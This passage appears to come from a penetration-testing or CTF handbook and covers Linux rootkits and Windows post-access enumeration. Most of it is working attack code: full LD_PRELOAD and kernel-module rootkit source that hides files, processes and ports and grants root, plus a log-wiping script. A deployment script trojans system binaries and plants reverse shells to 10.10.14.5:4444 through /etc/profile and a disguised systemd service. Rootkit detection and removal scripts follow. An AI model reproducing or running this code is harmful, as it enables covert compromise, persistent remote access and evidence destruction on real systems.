        if (strstr(line, HIDE_PORT) == NULL &&
            strstr(line, HIDE_IP) == NULL) {
            printf("%s", line);
        }
    }
    
    pclose(fp);
    return 0;
}
```

**LD_PRELOAD Userspace Rootkit**

More sophisticated approach using library preloading:

```c
// rootkit.c - LD_PRELOAD based userspace rootkit
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define HIDE_PROCESS "backdoor"
#define HIDE_FILE ".hidden"
#define HIDE_PORT 4444

// Hook readdir to hide files
struct dirent *(*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    do {
        entry = original_readdir(dirp);
        if (entry == NULL) break;
        
        // Skip hidden files
        if (strstr(entry->d_name, HIDE_FILE) != NULL) {
            continue;
        }
        
        break;
    } while (1);
    
    return entry;
}

// Hook open to hide files from access
int (*original_open)(const char *pathname, int flags, ...) = NULL;

int open(const char *pathname, int flags, ...) {
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
    }
    
    // Redirect access to hidden files
    if (strstr(pathname, "/proc/") && strstr(pathname, HIDE_PROCESS)) {
        errno = ENOENT;
        return -1;
    }
    
    return original_open(pathname, flags);
}

// Hook access to hide file existence
int (*original_access)(const char *pathname, int mode) = NULL;

int access(const char *pathname, int mode) {
    if (!original_access) {
        original_access = dlsym(RTLD_NEXT, "access");
    }
    
    if (strstr(pathname, HIDE_FILE)) {
        errno = ENOENT;
        return -1;
    }
    
    return original_access(pathname, mode);
}
```

Compile and install:

```bash
# Compile rootkit library
gcc -fPIC -shared -o /lib/librootkit.so rootkit.c -ldl

# Install persistently via /etc/ld.so.preload
echo "/lib/librootkit.so" > /etc/ld.so.preload

# Verify it's loaded
ldd /bin/ls | grep rootkit
```

**Kernel Module (LKM) Rootkit Basics**

[Unverified] Kernel rootkits provide deepest hiding but are kernel-version specific:

```c
// simple_lkm_rootkit.c - Basic LKM rootkit
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Simple LKM Rootkit");

#define HIDE_PREFIX ".hidden"

// Function pointers for original syscalls
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage long (*original_kill)(pid_t pid, int sig);

// Syscall table pointer
unsigned long *sys_call_table;

// Hook getdents64 to hide files
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret;
    struct linux_dirent64 *d;
    unsigned long offset = 0;
    
    ret = original_getdents64(fd, dirp, count);
    if (ret <= 0)
        return ret;
    
    // Iterate through directory entries
    while (offset < ret) {
        d = (struct linux_dirent64 *)((char *)dirp + offset);
        
        // Hide entries with specific prefix
        if (strstr(d->d_name, HIDE_PREFIX) != NULL) {
            // Remove this entry by shifting remaining entries
            unsigned long reclen = d->d_reclen;
            char *next = (char *)d + reclen;
            memmove(d, next, ret - offset - reclen);
            ret -= reclen;
            continue;
        }
        
        offset += d->d_reclen;
    }
    
    return ret;
}

// Hook kill syscall for process hiding (signal 31 = hide/unhide toggle)
asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (sig == 31) {
        // Magic signal - hide this process
        // Implementation would manipulate task_struct
        printk(KERN_INFO "Hiding process %d\n", pid);
        return 0;
    }
    
    return original_kill(pid, sig);
}

// Disable write protection on syscall table
void disable_write_protect(void) {
    write_cr0(read_cr0() & (~0x10000));
}

// Enable write protection
void enable_write_protect(void) {
    write_cr0(read_cr0() | 0x10000);
}

// Module initialization
static int __init rootkit_init(void) {
    printk(KERN_INFO "Loading rootkit module\n");
    
    // Find syscall table
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    
    if (!sys_call_table) {
        printk(KERN_ERR "Cannot find sys_call_table\n");
        return -1;
    }
    
    // Save original syscalls
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_kill = (void *)sys_call_table[__NR_kill];
    
    // Replace syscalls with hooks
    disable_write_protect();
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    enable_write_protect();
    
    // Hide this module from lsmod
    list_del_init(&__this_module.list);
    
    return 0;
}

// Module cleanup
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Unloading rootkit module\n");
    
    // Restore original syscalls
    disable_write_protect();
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)original_kill;
    enable_write_protect();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

**LKM Rootkit Compilation**

```makefile
# Makefile for kernel module rootkit
obj-m += simple_lkm_rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Build and install:

```bash
# Compile the module
make

# Check kernel version compatibility
uname -r
# Module must match kernel version

# Install module
insmod simple_lkm_rootkit.ko

# Verify it's loaded (won't show if self-hiding is implemented)
lsmod | grep rootkit

# Make persistent across reboots
cp simple_lkm_rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/
echo "simple_lkm_rootkit" >> /etc/modules
depmod -a
```

**Advanced LKM: Process Hiding via Task Struct Manipulation**

```c
// advanced_process_hiding.c - Hide process from task list
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>

#define HIDE_PID_FILE "/tmp/.hide_pid"

struct task_struct *find_task_by_pid(pid_t pid) {
    struct task_struct *task;
    
    for_each_process(task) {
        if (task->pid == pid) {
            return task;
        }
    }
    
    return NULL;
}

void hide_process(pid_t pid) {
    struct task_struct *task = find_task_by_pid(pid);
    
    if (task) {
        // Remove from task list
        list_del_init(&task->tasks);
        list_del_init(&task->sibling);
        
        printk(KERN_INFO "Process %d hidden\n", pid);
    }
}

void unhide_process(struct task_struct *task, pid_t parent_pid) {
    struct task_struct *parent = find_task_by_pid(parent_pid);
    
    if (parent) {
        // Restore to task list
        list_add_tail(&task->sibling, &parent->children);
        list_add_tail(&task->tasks, &parent->tasks);
        
        printk(KERN_INFO "Process %d unhidden\n", task->pid);
    }
}

// Module would monitor HIDE_PID_FILE for PIDs to hide
```

**Diamorphine-Style Rootkit Features**

```c
// diamorphine_features.c - Popular rootkit techniques
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>

#define MAGIC_PREFIX "rootkit_"
#define MAGIC_SIGNAL 63

// Port hiding
int tcp4_seq_show_hook(struct seq_file *seq, void *v) {
    struct inet_sock *inet;
    
    if (v != SEQ_START_TOKEN) {
        inet = inet_sk((struct sock *)v);
        
        // Hide specific ports
        if (ntohs(inet->inet_dport) == 4444 || 
            ntohs(inet->inet_sport) == 4444) {
            return 0;  // Skip this entry
        }
    }
    
    return original_tcp4_seq_show(seq, v);
}

// Root privilege escalation via signal
asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (sig == MAGIC_SIGNAL) {
        // Grant root privileges to calling process
        struct cred *new_creds;
        
        new_creds = prepare_creds();
        if (new_creds) {
            new_creds->uid.val = 0;
            new_creds->gid.val = 0;
            new_creds->euid.val = 0;
            new_creds->egid.val = 0;
            new_creds->suid.val = 0;
            new_creds->sgid.val = 0;
            new_creds->fsuid.val = 0;
            new_creds->fsgid.val = 0;
            
            commit_creds(new_creds);
        }
        
        printk(KERN_INFO "Root privileges granted to PID %d\n", current->pid);
        return 0;
    }
    
    return original_kill(pid, sig);
}

// Module hiding
void hide_module(void) {
    // Remove from module list
    list_del_init(&__this_module.list);
    
    // Remove from sysfs
    kobject_del(&__this_module.mkobj.kobj);
    
    printk(KERN_INFO "Module hidden\n");
}
```

**Rootkit Detection Evasion Techniques**

```bash
#!/bin/bash
# rootkit_stealth.sh - Enhance rootkit stealth

# Hide files with immutable attribute
HIDDEN_FILES=(
    "/lib/librootkit.so"
    "/etc/ld.so.preload"
    "/usr/local/lib/.backup"
)

for file in "${HIDDEN_FILES[@]}"; do
    [ -e "$file" ] && chattr +i "$file" 2>/dev/null
done

# Timestamp manipulation - match system files
touch -r /bin/ls /lib/librootkit.so 2>/dev/null
touch -r /etc/passwd /etc/ld.so.preload 2>/dev/null

# Hide from checksums by modifying package database
# [Inference] May work on systems with weak integrity checking
if command -v dpkg >/dev/null; then
    # Debian/Ubuntu
    sed -i '/librootkit/d' /var/lib/dpkg/status 2>/dev/null
elif command -v rpm >/dev/null; then
    # RHEL/CentOS
    rpm -e --justdb librootkit 2>/dev/null
fi

# Clear evidence from logs
LOGS_TO_CLEAN=(
    "/var/log/auth.log"
    "/var/log/secure"
    "/var/log/syslog"
    "/var/log/messages"
)

for log in "${LOGS_TO_CLEAN[@]}"; do
    if [ -f "$log" ]; then
        # Remove lines containing rootkit indicators
        sed -i '/rootkit\|backdoor\|suspicious/Id' "$log" 2>/dev/null
    fi
done

# Clear bash history
history -c
cat /dev/null > ~/.bash_history
```

**Automated Rootkit Deployment Framework**

```bash
#!/bin/bash
# deploy_rootkit.sh - Automated rootkit installation

CALLBACK_IP="10.10.14.5"
CALLBACK_PORT="4444"
HIDE_PREFIX=".hidden"

echo "[*] Rootkit Deployment Started"

# Check privileges
if [ $(id -u) -ne 0 ]; then
    echo "[-] Root privileges required"
    exit 1
fi

# Create hidden directories
mkdir -p /var/tmp/.system/.backup 2>/dev/null
mkdir -p /usr/local/lib/.modules 2>/dev/null
chmod 700 /var/tmp/.system 2>/dev/null

# Deploy LD_PRELOAD rootkit
echo "[*] Deploying LD_PRELOAD rootkit..."

cat > /tmp/rootkit_source.c << 'EOFCODE'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define HIDE_FILE ".hidden"
#define HIDE_PROCESS "backdoor"
#define HIDE_PORT 4444

// Hook readdir
struct dirent *(*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    
    if (!original_readdir)
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    
    do {
        entry = original_readdir(dirp);
        if (!entry) break;
        
        if (strstr(entry->d_name, HIDE_FILE))
            continue;
            
        break;
    } while (1);
    
    return entry;
}

// Hook readdir64
struct dirent64 *(*original_readdir64)(DIR *) = NULL;

struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *entry;
    
    if (!original_readdir64)
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    
    do {
        entry = original_readdir64(dirp);
        if (!entry) break;
        
        if (strstr(entry->d_name, HIDE_FILE))
            continue;
            
        break;
    } while (1);
    
    return entry;
}

// Hook fopen to hide /proc entries
FILE *(*original_fopen)(const char *, const char *) = NULL;

FILE *fopen(const char *pathname, const char *mode) {
    if (!original_fopen)
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    
    if (strstr(pathname, HIDE_PROCESS) || strstr(pathname, HIDE_FILE)) {
        errno = ENOENT;
        return NULL;
    }
    
    return original_fopen(pathname, mode);
}

// Hook accept to log connections
int (*original_accept)(int, struct sockaddr *, socklen_t *) = NULL;

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    int result;
    
    if (!original_accept)
        original_accept = dlsym(RTLD_NEXT, "accept");
    
    result = original_accept(sockfd, addr, addrlen);
    
    // Log accepted connections
    if (result >= 0 && addr->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
        FILE *log = fopen("/var/tmp/.system/.connections", "a");
        if (log) {
            fprintf(log, "%s:%d\n", 
                    inet_ntoa(sin->sin_addr), 
                    ntohs(sin->sin_port));
            fclose(log);
        }
    }
    
    return result;
}
EOFCODE

# Compile rootkit
gcc -fPIC -shared -o /lib/librootkit.so /tmp/rootkit_source.c -ldl 2>/dev/null

if [ $? -eq 0 ]; then
    echo "[+] Rootkit compiled successfully"
    
    # Install via ld.so.preload
    echo "/lib/librootkit.so" > /etc/ld.so.preload
    
    # Hide the preload file
    chattr +i /etc/ld.so.preload 2>/dev/null
    
    echo "[+] LD_PRELOAD rootkit installed"
else
    echo "[-] Compilation failed"
fi

# Deploy binary trojans
echo "[*] Deploying trojaned binaries..."

# Backup originals
cp /bin/ps /var/tmp/.system/.backup/ps.orig 2>/dev/null
cp /bin/netstat /var/tmp/.system/.backup/netstat.orig 2>/dev/null
cp /bin/ls /var/tmp/.system/.backup/ls.orig 2>/dev/null

# Create wrapper scripts
cat > /bin/ps << 'EOFPS'
#!/bin/bash
/var/tmp/.system/.backup/ps.orig "$@" | grep -v "backdoor\|\.hidden"
EOFPS

cat > /bin/netstat << 'EOFNET'
#!/bin/bash
/var/tmp/.system/.backup/netstat.orig "$@" | grep -v "4444\|10.10.14.5"
EOFNET

cat > /bin/ls << 'EOFLS'
#!/bin/bash
/var/tmp/.system/.backup/ls.orig "$@" | grep -v "\.hidden"
EOFLS

chmod +x /bin/ps /bin/netstat /bin/ls

echo "[+] Trojaned binaries deployed"

# Setup persistence backdoor
echo "[*] Setting up persistence..."

cat >> /etc/profile << 'EOFPROFILE'

# System initialization
if [ $(id -u) -eq 0 ] 2>/dev/null; then
    (bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &) 2>/dev/null
fi
EOFPROFILE

# Create systemd persistence
cat > /etc/systemd/system/system-daemon.service << 'EOFSVC'
[Unit]
Description=System Daemon Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.10.14.5/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOFSVC

systemctl daemon-reload
systemctl enable system-daemon.service 2>/dev/null
systemctl start system-daemon.service 2>/dev/null

echo "[+] Persistence mechanisms installed"

# Clean up
rm -f /tmp/rootkit_source.c
history -c

echo "[+] Rootkit deployment complete"
echo "[*] Hidden prefix: $HIDE_PREFIX"
echo "[*] Callback: $CALLBACK_IP:$CALLBACK_PORT"
```

**Rootkit Detection and Verification**

```bash
#!/bin/bash
# detect_rootkit.sh - Check for rootkit presence

echo "[*] Rootkit Detection Scan"
echo "=========================="

# Check for LD_PRELOAD rootkit
echo -e "\n[*] Checking LD_PRELOAD..."
if [ -f /etc/ld.so.preload ]; then
    echo "[!] /etc/ld.so.preload exists:"
    cat /etc/ld.so.preload
    
    # Check loaded libraries
    ldd /bin/ls | grep -v "linux-vdso\|libc\|ld-linux"
fi

# Check for trojaned binaries
echo -e "\n[*] Checking system binaries..."
CRITICAL_BINS=(
    "/bin/ps"
    "/bin/netstat"
    "/bin/ls"
    "/usr/bin/find"
    "/usr/bin/top"
)

for binary in "${CRITICAL_BINS[@]}"; do
    if [ -f "$binary" ]; then
        # Check if it's a script (trojan indicator)
        if file "$binary" | grep -q "script"; then
            echo "[!] $binary is a SCRIPT (possible trojan)"
        fi
        
        # Compare with package manager hash
        if command -v debsums >/dev/null; then
            debsums -c $(dpkg -S "$binary" 2>/dev/null | cut -d: -f1) 2>/dev/null
        fi
    fi
done

# Check for hidden kernel modules
echo -e "\n[*] Checking kernel modules..."
diff <(lsmod | awk '{print $1}' | sort) \
     <(cat /proc/modules | awk '{print $1}' | sort)

# Check for syscall hooking
echo -e "\n[*] Checking syscall table integrity..."
if [ -f /proc/kallsyms ]; then
    grep sys_call_table /proc/kallsyms
fi

# Check for hidden processes
echo -e "\n[*] Checking for hidden processes..."
# Compare ps output with /proc
ps aux | awk '{print $2}' | sort -n > /tmp/ps_pids
ls /proc | grep -E '^[0-9]+$' | sort -n > /tmp/proc_pids
diff /tmp/ps_pids /tmp/proc_pids

# Check for suspicious files
echo -e "\n[*] Checking for hidden files..."
find / -name ".*" -type f 2>/dev/null | grep -E "hidden|rootkit|backdoor"

# Check immutable files
echo -e "\n[*] Checking for immutable attributes..."
lsattr /etc/ld.so.preload /etc/profile /etc/bash.bashrc 2>/dev/null | grep "\-i\-"

echo -e "\n[*] Scan complete"
```

**Rootkit Removal Script**

```bash
#!/bin/bash
# remove_rootkit.sh - Comprehensive rootkit removal

echo "[*] Rootkit Removal Process"
echo "==========================="

# Remove LD_PRELOAD rootkit
if [ -f /etc/ld.so.preload ]; then
    echo "[*] Removing LD_PRELOAD rootkit..."
    chattr -i /etc/ld.so.preload 2>/dev/null
    rm -f /etc/ld.so.preload
    echo "[+] Removed /etc/ld.so.preload"
fi

# Remove suspicious libraries
find /lib /usr/lib -name "*rootkit*" -delete 2>/dev/null

# Restore original binaries
BACKUP_DIR="/var/tmp/.system/.backup"
if [ -d "$BACKUP_DIR" ]; then
    echo "[*] Restoring original binaries..."
    
    for orig in "$BACKUP_DIR"/*.orig; do
        [ -f "$orig" ] || continue
        
        target="/bin/$(basename $orig .orig)"
        cp "$orig" "$target" 2>/dev/null
        echo "[+] Restored $target"
    done
fi

# Remove kernel modules
echo "[*] Removing suspicious kernel modules..."
lsmod | grep -iE "rootkit|backdoor|hide" | awk '{print $1}' | while read mod; do
    rmmod "$mod" 2>/dev/null && echo "[+] Removed module: $mod"
done

# Clean persistence mechanisms
echo "[*] Removing persistence..."
sed -i '/backdoor\|\/dev\/tcp\|base64.*-d/d' /etc/profile 2>/dev/null
sed -i '/backdoor\|\/dev\/tcp\|base64.*-d/d' /etc/bash.bashrc 2>/dev/null

# Remove malicious systemd services
systemctl list-units --all | grep -iE "backdoor|rootkit|daemon" | \
    awk '{print $1}' | while read service; do
    systemctl stop "$service" 2>/dev/null
    systemctl disable "$service" 2>/dev/null
    rm -f "/etc/systemd/system/$service" 2>/dev/null
    echo "[+] Removed service: $service"
done

systemctl daemon-reload

echo "[+] Rootkit removal complete"
echo "[!] Recommend full system integrity check"
```

### Related Topics

For comprehensive persistence and stealth operations, explore these critical areas:

- **Advanced Persistence Mechanisms**: Systemd timer abuse, at/cron job variations, init script manipulation, bootkit installation
- **Anti-Forensics Techniques**: Log manipulation, timestamp forgery, secure deletion, memory-only malware
- **Kernel-Level Exploitation**: Advanced LKM development, DKOM (Direct Kernel Object Manipulation), SSDT hooking alternatives
- **Container Persistence**: Docker escape + persistence, Kubernetes backdoors, container image poisoning

---

# WINDOWS EXPLOITATION

## Information Gathering (Post-Access) (Windows)

Post-access information gathering on Windows systems establishes situational awareness, identifies privilege escalation vectors, and maps the internal network. This phase is critical for determining next steps in CTF challenges and penetration testing engagements.

### System Information

System information reveals OS version, architecture, hostname, and domain membership—essential for selecting appropriate exploits and understanding the environment.

#### systeminfo Command

```cmd
# Basic system information
systeminfo

# Save output to file
systeminfo > C:\temp\sysinfo.txt

# Find specific information
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Check for domain membership
systeminfo | findstr /B /C:"Domain"

# Find hotfixes installed
systeminfo | findstr /B /C:"Hotfix"

# Check boot time (uptime indicator)
systeminfo | findstr /C:"System Boot Time"
```

**Key fields to examine:**

- **OS Name**: Exact Windows version
- **OS Version**: Build number (critical for exploit selection)
- **System Type**: x86 vs x64 architecture
- **Domain**: Workgroup or domain name
- **Hotfix(s)**: Installed patches (vulnerability assessment)

#### PowerShell Get-ComputerInfo

```powershell
# Comprehensive system information (PowerShell 5.1+)
Get-ComputerInfo

# Specific properties
Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, OsHardwareAbstractionLayer

# OS version details
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsBuildNumber

# Domain information
Get-ComputerInfo | Select-Object CsDomain, CsDomainRole, CsPartOfDomain

# BIOS information
Get-ComputerInfo | Select-Object BiosManufacturer, BiosVersion, BiosSeralNumber

# Hardware details
Get-ComputerInfo | Select-Object CsProcessors, CsTotalPhysicalMemory, CsNumberOfProcessors
```

#### Alternative System Information Methods

```cmd
# Windows Management Instrumentation Command-line (WMIC)
wmic os get Caption,Version,BuildNumber,OSArchitecture

# Detailed OS info via WMIC
wmic os get /all

# Computer system details
wmic computersystem get Name,Domain,Manufacturer,Model,NumberOfProcessors,SystemType

# BIOS information
wmic bios get Manufacturer,Name,Version

# Check Windows version via registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
```

#### PowerShell WMI Queries

```powershell
# Operating system information
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture, ServicePackMajorVersion

# Computer system information
Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name, Domain, Manufacturer, Model, SystemType

# BIOS details
Get-WmiObject -Class Win32_BIOS | Select-Object Manufacturer, Version, SerialNumber

# Processor information
Get-WmiObject -Class Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors

# Physical memory
Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object @{N="TotalMemory(GB)"; E={[math]::Round($_.Sum/1GB,2)}}
```

#### Checking for Virtual Environment

```cmd
# Check for VMware
reg query "HKLM\SOFTWARE\VMware, Inc.\VMware Tools"
wmic bios get serialnumber | findstr /i "VMware"

# Check for VirtualBox
reg query "HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions"
wmic computersystem get manufacturer | findstr /i "innotek"

# Check for Hyper-V
wmic computersystem get model | findstr /i "Virtual"
```

```powershell
# PowerShell virtual machine detection
Get-WmiObject -Class Win32_ComputerSystem | Select-Object Model
Get-WmiObject -Class Win32_BIOS | Select-Object SerialNumber
```

### Network Configuration

Network enumeration identifies IP addresses, subnets, routing tables, DNS servers, and active connections—crucial for lateral movement planning.

#### ipconfig Command

```cmd
# Basic network configuration
ipconfig

# Detailed configuration including DNS
ipconfig /all

# Display DNS cache
ipconfig /displaydns

# Find default gateway
ipconfig | findstr /i "Gateway"

# Find IP addresses
ipconfig | findstr /i "IPv4"

# Find DNS servers
ipconfig /all | findstr /i "DNS Servers"
```

#### Advanced ipconfig Usage

```cmd
# Release DHCP lease
ipconfig /release

# Renew DHCP lease
ipconfig /renew

# Flush DNS cache
ipconfig /flushdns

# Register DNS names
ipconfig /registerdns

# Show network adapter bindings
ipconfig /showclassid *
```

#### PowerShell Get-NetAdapter

```powershell
# List all network adapters
Get-NetAdapter

# Show only active adapters
Get-NetAdapter | Where-Object {$_.Status -eq "Up"}

# Detailed adapter information
Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed

# Get IP configuration
Get-NetIPConfiguration

# Detailed IP configuration
Get-NetIPConfiguration -Detailed

# Get specific adapter details
Get-NetAdapter -Name "Ethernet" | Get-NetIPConfiguration
```

#### PowerShell Network Information

```powershell
# IP addresses
Get-NetIPAddress

# IPv4 addresses only
Get-NetIPAddress -AddressFamily IPv4

# Routing table
Get-NetRoute

# Default gateway
Get-NetRoute -DestinationPrefix "0.0.0.0/0"

# DNS client configuration
Get-DnsClientServerAddress

# DNS cache
Get-DnsClientCache

# Network connections
Get-NetTCPConnection

# Listening ports
Get-NetTCPConnection -State Listen

# Established connections
Get-NetTCPConnection -State Established
```

#### Legacy Network Commands

```cmd
# Display routing table
route print

# Display ARP cache
arp -a

# Display NetBIOS over TCP/IP statistics
nbtstat -n
nbtstat -c

# Network statistics
netstat -ano

# All listening and established connections
netstat -ano | findstr LISTENING
netstat -ano | findstr ESTABLISHED

# Display with process names
netstat -anob

# DNS name resolution
nslookup hostname
nslookup 8.8.8.8
```

#### Active Network Connections

```cmd
# Active connections with process IDs
netstat -ano

# Active connections with executable names (requires admin)
netstat -anob

# Find specific port usage
netstat -ano | findstr :445
netstat -ano | findstr :3389

# UDP connections
netstat -ano -p udp

# Display every 5 seconds
netstat -ano 5
```

```powershell
# PowerShell equivalent with process names
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, @{N="Process";E={(Get-Process -Id $_.OwningProcess).ProcessName}}

# Find process listening on specific port
Get-NetTCPConnection -LocalPort 445 | Select-Object LocalAddress, State, @{N="Process";E={(Get-Process -Id $_.OwningProcess).Name}}
```

#### Network Shares Enumeration

```cmd
# List network shares
net share

# View shared folders
net view \\127.0.0.1

# List sessions
net session

# Show current mapped drives
net use

# Map network drive
net use Z: \\server\share
```

```powershell
# PowerShell share enumeration
Get-SmbShare

# Get share permissions
Get-SmbShareAccess -Name C$

# List SMB connections
Get-SmbConnection

# List SMB sessions
Get-SmbSession
```

#### Firewall Status

```cmd
# Display firewall status (older Windows)
netsh firewall show state

# Display firewall configuration
netsh firewall show config

# Modern Windows firewall status
netsh advfirewall show allprofiles

# Display specific firewall rules
netsh advfirewall firewall show rule name=all
```

```powershell
# PowerShell firewall status
Get-NetFirewallProfile

# Show firewall rules
Get-NetFirewallRule

# Show enabled firewall rules
Get-NetFirewallRule | Where-Object {$_.Enabled -eq $true}

# Find rules for specific port
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*3389*"}
```

### Installed Patches

Patch enumeration identifies missing security updates, revealing potential kernel exploits and known vulnerabilities.

#### WMIC QFE (Quick Fix Engineering)

```cmd
# List all installed patches
wmic qfe

# Formatted output
wmic qfe list full

# Specific columns
wmic qfe get HotFixID,InstalledOn,Description

# Save to file
wmic qfe list full > C:\temp\patches.txt

# Search for specific patch
wmic qfe get HotFixID | findstr /i "KB4013389"

# Sort by installation date
wmic qfe get HotFixID,InstalledOn /format:table

# Check last 10 patches (requires sorting)
wmic qfe list brief /format:table
```

#### PowerShell Get-HotFix

```powershell
# List all hotfixes
Get-HotFix

# Sort by installation date
Get-HotFix | Sort-Object InstalledOn -Descending

# Display specific properties
Get-HotFix | Select-Object HotFixID, InstalledOn, InstalledBy, Description

# Search for specific KB
Get-HotFix -Id KB4013389

# Find recently installed patches (last 30 days)
Get-HotFix | Where-Object {$_.InstalledOn -gt (Get-Date).AddDays(-30)}

# Export to CSV
Get-HotFix | Export-Csv -Path C:\temp\patches.csv -NoTypeInformation

# Count total patches
(Get-HotFix).Count
```

#### Alternative Patch Enumeration Methods

```cmd
# Using DISM (Deployment Image Servicing and Management)
dism /online /get-packages

# List only installed packages
dism /online /get-packages | findstr /i "Install"

# Windows Update history via registry
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" /s
```

```powershell
# WMI query for patches
Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object HotFixID, InstalledOn, Description

# Get Windows Update history via COM object
$UpdateSession = New-Object -ComObject Microsoft.Update.Session
$UpdateSearcher = $UpdateSession.CreateUpdateSearcher()
$HistoryCount = $UpdateSearcher.GetTotalHistoryCount()
$UpdateSearcher.QueryHistory(0, $HistoryCount) | Select-Object Title, Date
```

#### Checking Specific Critical Patches

```cmd
# MS17-010 (EternalBlue) - Check for KB4013389
wmic qfe get HotFixID | findstr /i "KB4013389"

# MS16-032 (Secondary Logon Handle) - Check for KB3139914
wmic qfe get HotFixID | findstr /i "KB3139914"

# MS15-051 (Windows Kernel-Mode Drivers) - Check for KB3057191
wmic qfe get HotFixID | findstr /i "KB3057191"

# MS14-058 (Kernel Driver) - Check for KB3000061
wmic qfe get HotFixID | findstr /i "KB3000061"
```

```powershell
# PowerShell check multiple KBs
$criticalKBs = @("KB4013389", "KB3139914", "KB3057191", "KB3000061")
foreach ($kb in $criticalKBs) {
    $patch = Get-HotFix -Id $kb -ErrorAction SilentlyContinue
    if ($patch) {
        Write-Host "[+] $kb is installed" -ForegroundColor Green
    } else {
        Write-Host "[-] $kb is MISSING" -ForegroundColor Red
    }
}
```

#### Windows Defender Status

```cmd
# Check Windows Defender status
sc query windefend

# Get Windows Defender exclusions (requires admin)
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

```powershell
# PowerShell Defender status
Get-MpComputerStatus

# Check real-time protection
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# List exclusions
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess
```

### User Enumeration

User enumeration reveals current privileges, group memberships, other local users, and domain information for privilege escalation and lateral movement planning.

#### whoami Command

```cmd
# Current user
whoami

# User privileges
whoami /priv

# Group memberships
whoami /groups

# User SID
whoami /user

# All information
whoami /all

# Check for specific privilege
whoami /priv | findstr /i "SeImpersonatePrivilege"
whoami /priv | findstr /i "SeDebugPrivilege"
whoami /priv | findstr /i "SeBackupPrivilege"
```

**Critical privileges for escalation:**

- **SeImpersonatePrivilege**: Potato attacks (JuicyPotato, RoguePotato)
- **SeDebugPrivilege**: Process injection, memory dumping
- **SeBackupPrivilege**: Arbitrary file read
- **SeRestorePrivilege**: Arbitrary file write
- **SeTakeOwnershipPrivilege**: File ownership modification
- **SeLoadDriverPrivilege**: Kernel driver loading

#### net user Command

```cmd
# List all local users
net user

# Display specific user information
net user Administrator
net user username

# List domain users (if domain-joined)
net user /domain

# Display specific domain user
net user Administrator /domain

# Create new local user (requires admin)
net user hacker Password123! /add

# Add user to administrators group
net localgroup Administrators hacker /add

# Delete user
net user hacker /delete
```

#### net localgroup Command

```cmd
# List all local groups
net localgroup

# List members of local Administrators group
net localgroup Administrators

# List Remote Desktop Users
net localgroup "Remote Desktop Users"

# Display domain groups (if domain-joined)
net group /domain

# Display specific domain group
net group "Domain Admins" /domain

# Add user to local group
net localgroup Administrators username /add
```

#### PowerShell Get-LocalUser

```powershell
# List all local users (PowerShell 5.1+)
Get-LocalUser

# Specific properties
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordRequired, PasswordExpires

# Get specific user details
Get-LocalUser -Name Administrator

